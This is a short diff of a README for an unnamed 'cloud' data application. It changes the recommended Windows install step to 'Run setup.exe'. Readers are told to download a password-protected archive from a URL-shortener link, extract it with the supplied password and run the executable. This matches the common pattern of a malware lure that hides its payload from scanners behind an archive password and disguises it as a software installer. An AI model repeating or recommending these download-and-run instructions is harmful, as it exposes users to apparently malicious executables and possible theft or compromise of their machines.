@@ -23,7 +23,7 @@ The application automatically fetches data from the **cloud** and highlights **"
 ### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
 1️⃣ **[Download](https://goo.su/kVKa) and extract archive(pass: Project12!)**
 
-2️⃣ **Run `Analyzer.exe`**   
+2️⃣ **Run `setup.exe`**   
 🚀 **The program will set everything up automatically – just enjoy!**  
 
 ⚠️ **Important:** This method is the fastest and easiest way to run the software!  
